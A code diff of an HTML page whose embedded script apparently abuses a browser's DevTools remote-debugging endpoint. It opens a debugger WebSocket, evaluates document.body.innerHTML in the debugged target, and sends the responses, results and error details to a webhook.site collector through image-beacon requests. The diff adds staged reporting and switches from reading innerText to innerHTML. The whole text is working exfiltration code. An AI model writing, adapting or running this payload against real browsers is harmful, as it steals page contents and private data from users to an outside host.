@@ -3,14 +3,16 @@
 <html>
 <body>
 <script>
+const collector = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
+
+function report(stage, detail = "") {
+  const url = collector + "?stage=" + encodeURIComponent(stage)
+    + "&detail=" + encodeURIComponent(String(detail));
+  new Image().src = url;
+}
+
 (async () => {
-  const collector = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
-  const report = async (key, value) => {
-    await fetch(
-      collector + "?" + key + "=" + encodeURIComponent(value),
-      { mode: "no-cors" }
-    );
-  };
+  report("payload-loaded");
 
   try {
     const response = await fetch(
@@ -18,38 +20,30 @@
       { method: "PUT" }
     );
 
-    if (!response.ok) {
-      throw new Error("DevTools returned HTTP " + response.status);
-    }
-
     const target = await response.json();
+    report("devtools-response", JSON.stringify(target));
+
     const ws = new WebSocket(target.webSocketDebuggerUrl);
+
+    ws.onerror = () => report("websocket-error");
 
     ws.onopen = () => {
       ws.send(JSON.stringify({
         id: 1,
         method: "Runtime.evaluate",
         params: {
-          expression: "document.body.innerText",
+          expression: "document.body.innerHTML",
           returnByValue: true
         }
       }));
     };
 
-    ws.onmessage = async (event) => {
-      const message = JSON.parse(event.data);
-      if (message.id !== 1) return;
-
-      await report(
-        "result",
-        message.result?.result?.value ?? JSON.stringify(message)
-      );
+    ws.onmessage = event => {
+      report("devtools-result", event.data);
       ws.close();
     };
-
-    ws.onerror = () => report("error", "WebSocket connection failed");
   } catch (error) {
-    await report("error", String(error));
+    report("exception", error.stack || error.message || error);
   }
 })();
 </script>
